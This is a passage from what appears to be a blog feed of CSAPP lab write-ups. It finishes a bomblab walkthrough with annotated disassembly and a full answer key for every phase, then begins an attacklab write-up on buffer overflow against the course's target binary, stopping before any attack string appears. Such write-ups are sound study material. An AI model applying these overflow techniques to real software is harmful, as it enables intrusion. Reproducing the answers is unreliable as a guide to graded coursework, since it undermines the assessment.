!!!!--------判断这个数是否处于[1,6]之间</span><br><span class="line">  401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt; #&gt;5 bomb</span><br><span class="line">  401128:	41 83 c4 01          	add    $0x1,%r12d # r12d++ r12d = 1 当前值的索引值加1</span><br><span class="line">  40112c:	41 83 fc 06          	cmp    $0x6,%r12d # #循环6次</span><br><span class="line">  401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt; #相等则跳转401153</span><br><span class="line">  401132:	44 89 e3             	mov    %r12d,%ebx #ebx = r12d 索引下一个数</span><br><span class="line">  ------------------------#嵌套循环 ！！！判断这个数是否与数组中其余数相等</span><br><span class="line">  401135:	48 63 c3             	movslq %ebx,%rax #sign 符号拓展 索引放入rax </span><br><span class="line">  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax #eax = 4*rax + rsp 算出上面查过数的地址，通过地址找到这个数，放入eax rsp[4*ebx]</span><br><span class="line">  40113b:	39 45 00             	cmp    %eax,0x0(%rbp) #把eax找的数与rbp的比较 即六个数字不能相等</span><br><span class="line">  40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt; #不相等则跳转401145</span><br><span class="line">  401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt; #相等则bomb</span><br><span class="line">  401145:	83 c3 01             	add    $0x1,%ebx #ebx++</span><br><span class="line">  401148:	83 fb 05             	cmp    $0x5,%ebx #</span><br><span class="line">  40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt; #小于跳401135 循环</span><br><span class="line">  ---------------------- #嵌套循环结束</span><br><span class="line">  40114d:	49 83 c5 04          	add    $0x4,%r13 #r13继续指向下一个数</span><br><span class="line">  401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  -------------------------------------------------------------#大循环结束</span><br><span class="line">  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:	4c 89 f0             	mov    %r14,%rax #r14 = rsp = 输入的6个数</span><br><span class="line">  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx #exc = 7</span><br><span class="line">  401160:	89 ca                	mov    %ecx,%edx #edx=ecx = 7</span><br><span class="line">  401162:	2b 10                	sub    (%rax),%edx #rax 指向输入的数然后用7减 edx -= rax</span><br><span class="line">  401164:	89 10                	mov    %edx,(%rax) #将结果放入rax</span><br><span class="line">  401166:	48 83 c0 04          	add    $0x4,%rax #下一个数</span><br><span class="line">  40116a:	48 39 f0             	cmp    %rsi,%rax #比较rsi与rax</span><br><span class="line">  40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt; #不相等则跳转 441160循环直到把所有参数都改变了 </span><br><span class="line">  40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt; #全都不相等跳401197</span><br><span class="line">  --------------------------# edx中的7-int的元素放入 链表中</span><br><span class="line">  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx #rdx = *rdx + 8 字节对齐 p = p-&gt;next</span><br><span class="line">  40117a:	83 c0 01             	add    $0x1,%eax #eax++</span><br><span class="line">  40117d:	39 c8                	cmp    %ecx,%eax #</span><br><span class="line">  40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt; #不等跳401176</span><br><span class="line">  401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt; #否则跳401188</span><br><span class="line">  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx #链表头指针</span><br><span class="line">  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2) #rdx -》 rsp[2*rsi+0x20]</span><br><span class="line">  40118d:	48 83 c6 04          	add    $0x4,%rsi #指向下一个</span><br><span class="line">  401191:	48 83 fe 18          	cmp    $0x18,%rsi</span><br><span class="line">  401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt; #相等跳4011ab</span><br><span class="line">  ----------------------------------------------------------------</span><br><span class="line">  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx #ecx = rsp[rsi]</span><br><span class="line">  40119a:	83 f9 01             	cmp    $0x1,%ecx #和1 比较</span><br><span class="line">  40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt; #&lt;=1 跳转401183</span><br><span class="line">  40119f:	b8 01 00 00 00       	mov    $0x1,%eax # eax = 1</span><br><span class="line">  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx #edx = 0x6032d0 gdb一下 node变量</span><br><span class="line">  4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt; #然会跳转401176 上面那段</span><br><span class="line">  -------------------------------------------------------------------------</span><br><span class="line">  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx #rbx最初节点</span><br><span class="line">  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax # 下一个节点</span><br><span class="line">  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:	48 89 d9             	mov    %rbx,%rcx</span><br><span class="line">  -------------------------------------------------------------</span><br><span class="line">  4011bd:	48 8b 10             	mov    (%rax),%rdx #rax指向位置拿出node变量的地址</span><br><span class="line">  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx) #node-&gt;next</span><br><span class="line">  4011c4:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">  4011c8:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">  4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt; #相等跳 4011d2</span><br><span class="line">  4011cd:	48 89 d1             	mov    %rdx,%rcx</span><br><span class="line">  4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx) #指向最后一个节点</span><br><span class="line">  4011d9:	00 </span><br><span class="line">  ---------------------------------------------------------------------</span><br><span class="line">  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp #循环变量 索引</span><br><span class="line">  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax #rbx指向第一个索引对应的节点 node.next放入 rax</span><br><span class="line">  4011e3:	8b 00                	mov    (%rax),%eax #rax解引用指向节点的val值 放入eax</span><br><span class="line">  4011e5:	39 03                	cmp    %eax,(%rbx) #比较eax和 rbx（上一个元素）</span><br><span class="line">  4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt; #rbx大于eax后者 则跳转4011ee 通过</span><br><span class="line">  4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt; #否则就bomb</span><br><span class="line">  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:	83 ed 01             	sub    $0x1,%ebp #ebp--</span><br><span class="line">  4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt; #不循环</span><br><span class="line">  4011f7:	48 83 c4 50          	add    $0x50,%rsp #恢复栈顶</span><br><span class="line">  4011fb:	5b                   	pop    %rbx</span><br><span class="line">  4011fc:	5d                   	pop    %rbp</span><br><span class="line">  4011fd:	41 5c                	pop    %r12</span><br><span class="line">  4011ff:	41 5d                	pop    %r13</span><br><span class="line">  401201:	41 5e                	pop    %r14</span><br><span class="line">  401203:	c3                   	retq   </span><br></pre></td></tr></table></figure>



<p><strong>思路</strong></p>
<ul>
<li>实际上是链表的应用</li>
<li></li>
<li>将第一个大循环转换成c语言代码可以得</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> sixNum[<span class="number">6</span>] = &#123;输入的<span class="number">6</span>个数&#125; </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sixNum[i] &gt; <span class="number">6</span>) <span class="built_in">explode_bomb</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sixNum[i] == sixNum[j]) explode_bomb;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>x/wx 0x6032d0</code></p>
<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231028113244985.png" alt="image-20231028113244985"></li>
<li>node 变量 链表！！！</li>
</ul>
</li>
<li><p><code>x/24wx 0x6032d0</code> 24字节</p>
<ul>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231028114724993.png" alt="image-20231028114724993"></p>
</li>
<li><table>
<thead>
<tr>
<th align="center">索引</th>
<th align="center">值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">332[0x14c]</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">168[0xa8]</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">924[0x39c]</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">691[0x2b3]</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">477[0x1dd]</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">443[0x1bb]</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>单向链表：</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单链表</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;<span class="comment">//节点上存储的元素</span></span><br><span class="line">    ListNode *next;<span class="comment">//指向下一个节点的指针</span></span><br><span class="line">    <span class="built_in">ListNode</span> (<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>)&#123;&#125;<span class="comment">//节点的构造函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>那么前面的嵌套循环作用：根据输入的索引，找到对应的node值，并且把这个值放入到一个数组中</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Node* addresses[<span class="number">6</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="type">int</span> index = sixNum[i];</span><br><span class="line">    addresses[i] = &amp;node1;</span><br><span class="line">    <span class="keyword">while</span> (addresses[i]-&gt;index != index)&#123;</span><br><span class="line">        addresses[i] = addresses[i]-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>所以题目要我们输入的是<strong>链表的索引顺序</strong>，这个顺序是降序排列的，并且每个值都要用 7- 。所以降序排列顺序为<code>3 4 5 6 1 2</code>答案为 <code>4 3 2 1 6 5</code><ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231028152223411.png" alt="image-20231028152223411"></li>
</ul>
</li>
</ul>
<h2 id="3-7-secret-phase"><a href="#3-7-secret-phase" class="headerlink" title="3.7 secret_phase"></a>3.7 secret_phase</h2><p><strong>secret_phase coding:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt; #strtol 将字符串转换成long</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax #</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt; #小于跳0x40126c</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi # %edi存放地址</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax #2== eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt; #2等于2 跳结束</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>func_7</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi #test 如果两个数位与 则会将0标志位置1</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt; #判断是否是null 是返回1</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx #node-&gt;val</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx #与传入的值进行比较</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt; #小于等于则 401220</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi #左子树 递归 8位</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt; #递归</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax #eax += eax 翻倍 调用左子树</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax #eax = 0 归零</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx # 所以这一段需要额外判断等</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt; #等于 返回</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi #否则取其右子树 0x10 = 16 位</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	callq  401204 &lt;fun7&gt; #递归</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax #翻倍+1 调用右子树</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax #为null返回0xffffffff</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>满足6个数后phase_defused代码即0x4015e1之后:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4015e1:	4c 8d 44 24 10       	lea    0x`10(%rsp),%r8</span><br><span class="line">4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:	be 19 26 40 00       	mov    $0x402619,%esi</span><br><span class="line">4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi</span><br><span class="line">4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">4015ff:	83 f8 03             	cmp    $0x3,%eax #查看是否三个参数 不相等跳转0x401635</span><br><span class="line">401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">401604:	be 22 26 40 00       	mov    $0x402622,%esi #答案</span><br><span class="line">401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi #需要对比的字符串</span><br><span class="line">40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">401613:	85 c0                	test   %eax,%eax</span><br><span class="line">401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi</span><br><span class="line">40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">401621:	bf 20 25 40 00       	mov    $0x402520,%edi</span><br><span class="line">401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">40162b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br></pre></td></tr></table></figure>



<ol>
<li><p>搜索<code>secret_phase</code>，发现在<code>phase_defused</code>调用，然后搜索<code>phase_defused</code>，发现每个<code>phase</code>结束后都会调用。但不确定是哪个phase</p>
<p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029160310128.png" alt="image-20231029160310128"></p>
</li>
<li><p>在<code>phase_defused</code>看什么情况下才能触发<code>secret_phase</code>，当操作数不等于6时，直接跳0x40163f，直接返回，跳过了secret_phase</p>
<p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029160612778.png" alt="image-20231029160612778"></p>
</li>
<li><p>当输入的字符串数量等于6时才判断是否调用secret函数。——-<strong>即必须要解答6个bomb后才能调用secret_phase</strong></p>
</li>
<li><p>查看0x4015e1后的代码，调用了sscanf函数 对输入的字符串进行模板对比。</p>
<ol>
<li>在b 0x4015e1 设置断点，查看 地址0x402619 即sscanf的输入格式 <code>%d %d %s</code></li>
<li>然后查看0x603870传入sscanf是什么数<code>x/s 0x603870</code>为<code>7 0</code> ，恰好是<code>phase_4</code>输入的答案，因此可以推断，<code>phase_4</code><strong>应该输入特定的答案从而触发</strong><code>secret_phase</code>。</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029162326774.png" alt="image-20231029162326774"></li>
<li>再往下看，最后那个s%的字符串是是什么呢？可以看到将&#96;&#96;0x402622地址的字符串传入sstrings_not_equal<code> 判断与输入的是否相等 ，所以查看</code>0x402622<code>存放了什么。---</code>DrEvil&#96;</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029163445370.png" alt="image-20231029163445370"></li>
</ol>
</li>
</ol>
<p><strong>secret_phase解析：</strong></p>
<ol>
<li><p>将<code>phase_4</code>答案后面加上<code>DrEvil</code></p>
</li>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/CSAPP-3-bomblab%5Cimage-20231029164152074.png" alt="image-20231029164152074"></p>
</li>
<li><p><code>b secret_phase</code>打上断点，然后运行<code>r ans.txt</code>，<code>layout asm</code>看到调用了 <code>strtol</code> 将输入的字符串转换成<code>long</code>，然后比较 <code>eax</code> 和<code>0x3e8[1000]</code></p>
</li>
<li><p>调用 func 传入的参数是（%edi（0x6030f0），%esi（用户输入）），只有当func 7的返回值为2时才能避免爆炸。</p>
</li>
<li><p><code>0x6030f0</code>这个数就推断是个地址，<code>x/130xw</code> 查看这个地址，每个节点占据32位 分别是 val值（前四字节）、填充（4字节）、左子节点地址（8字节）、右子节点（8字节）。因此可以得出这个是一个<strong>二叉树结构</strong></p>
</li>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029192506719.png" alt="image-20231029192506719"></p>
</li>
<li><p>写成二叉树的形式如下：每个节点占据32位 分别是 val值（前四字节）、填充（4字节）、左子节点地址（8字节）、右子节点（8字节）。下面是16进制的表达</p>
</li>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231029192849626.png" alt="image-20231029192849626"></p>
</li>
<li><p>分析func7的汇编代码，可以写成如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun7</span><span class="params">(TreeNode* tree, <span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;val &lt; num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">fun7</span>(tree-&gt;right, num) +<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tree-&gt;val == num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">fun7</span>(tree-&gt;left, num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>所以可以看出，想要返回2，输入的值必须在数中，否则会返回负数。并且左边递归会无法返回2，只会把原来的值加倍，<strong>因此需要原来右子树递归+1</strong>，获取1，然后利用2*fun7() 获得2.</p>
</li>
<li><p>从根节点出发0x24，那么若向右走，<code>则执行 2*fun7(tree-&gt;right, num) + 1</code>想要return 2，需要fun7() &#x3D;&#x3D;0.5，显然不可能，<code>那么从左走 2*fun7(tree-&gt;left, num)</code>，到达节点0x8 第二层，此时，前面一次选择已经有2的倍数了，所以只需要能够获得1即可，那么怎么获得1呢？—-&gt;向右走<code>2*fun7(tree-&gt;right, num) + 1</code> 使得num 等于 右边子树的一个<code>fun7()==0</code>，所以就可以获得1，最终得到<code>2*(fun7(tree-&gt;right,num) + 1)</code>.<strong>所以num &#x3D;  0x16 或0x14</strong></p>
</li>
</ol>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p><strong>答案：</strong></p>
<ol>
<li>Border relations with Canada have never been better.</li>
<li>1 2 4 8 16 32</li>
<li>0 207</li>
<li>7 0 DrEvil</li>
<li>9?NUVW</li>
<li>4 3 2 1 6 5</li>
<li>20 或 22</li>
</ol>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>bomblab</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-3-attacklab</title>
    <url>/2023/11/02/CSAPP-3-attacklab/</url>
    <content><![CDATA[<h1 id="1-attack-lab-引言"><a href="#1-attack-lab-引言" class="headerlink" title="1.attack lab 引言"></a>1.attack lab 引言</h1><p><strong>参考：</strong></p>
<ul>
<li><a href="https://blog.csdn.net/qq_25591221/article/details/123301271?ops_request_misc=%7B%22request_id%22:%22166996863216800184131554%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166996863216800184131554&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123301271-null-null.142%5Ev67%5Econtrol,201%5Ev3%5Eadd_ask,213%5Ev2%5Et3_esquery_v3&utm_term=attacklab&spm=1018.2226.3001.4187">【精选】CSAPP-Lab03 Attack Lab 详细解析-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_53336526/article/details/128236163">【精选】CSAPP–ATTACKLAB实验_attack lab-CSDN博客</a></li>
</ul>
<p><strong>目的：</strong>理解缓冲区溢出错误</p>
<p><strong>文件解析：</strong></p>
<ul>
<li><code>ctarget</code>一个易受到code-injection攻击的可执行程序</li>
<li><code>rtarget</code>一个人易受到return-oriented-programming攻击的可执行程序</li>
<li><code>cookie</code>一个8位的十六进制编码，唯一标识符用于身份验证</li>
<li><code>farm</code>目标gadget-farm的源代码，产生return-oriented programming的时候会用到</li>
<li><code>hex2raw</code>一个生成攻击字符串的程序</li>
</ul>
<p><strong>函数运行：</strong></p>
<ul>
<li>当运行<code>./ctarget</code>报错<code>Running on an illegal host [DESKTOP-7HBMUNV]</code></li>
<li>则需要运行<code>./ctarget -q</code>不参与在线评分系统</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102151714240.png" alt="image-20231102151714240"></li>
</ul>
<p><strong>实验阶段：</strong></p>
<p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102152252030.png" alt="image-20231102152252030"></p>
<h1 id="2-code-injection-attacks"><a href="#2-code-injection-attacks" class="headerlink" title="2.code-injection-attacks"></a>2.code-injection-attacks</h1><p>利用字符串攻击ctarget</p>
<h2 id="2-1-lever-1"><a href="#2-1-lever-1" class="headerlink" title="2.1 lever 1"></a>2.1 lever 1</h2><ul>
<li><p>不需要注入新代码，输入字符串需要指引程序去执行一个已经存在的函数。</p>
</li>
<li><p>ctarget中函数test调用了 getbuf，test的函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf(); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>getbuf执行返回语句时（第五行），按照规则，程序会继续执行test函数中的语句，而我们想要改变这个行为，touch1代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>任务让ctarget在getbuf执行返回语句后执行touch1的代码，注意：攻击字符串可以破坏栈中不直接和本阶段相关的部分，这不会造成问题，因为touch1会使得程序直接退出。</p>
</li>
</ul>
<p><strong>建议：</strong></p>
<ul>
<li>设计本阶段的攻击字符串所需的信息都从检查CTARGET的反汇编代码中获得。用objdump -d进行反汇编。</li>
<li>主要思路是找到touch1的起始地址的字节表示的位置，使得getbuf结尾处的ret指令会将控制转移到touch1。</li>
<li>注意字节顺序。</li>
<li>可能需要用GDB单步跟踪调试getbuf的最后几条指令，确保它按照你期望的方式工作。</li>
<li>buf在getbuf栈帧中的位置取决于编译时常数BUFFER_SIZE的值，以及GCC使用的分配策略。你需要检查反汇编带来来确定它的位置。</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li><p>对ctarget仅下反汇编。</p>
</li>
<li><p>得到test的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp  #栈顶开辟8字节</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax  #eax = 0</span><br><span class="line">  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt; #调用getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx #edx = eax</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi #</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>getbuf的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp #0x28 = 40 开辟了40字节的栈空间</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br></pre></td></tr></table></figure>


</li>
<li><p>以及touch1的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip) # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>test 栈顶开辟了0x8 8个字节地址空间，getbuf栈顶开辟了0x28  40个字节地址空间，所以此时的栈顶结构如下：</p>
<ul>
<li></li>
</ul>
<table>
<thead>
<tr>
<th align="center">栈</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center">test</td>
</tr>
<tr>
<td align="center">返回地址</td>
<td align="center">ret</td>
</tr>
<tr>
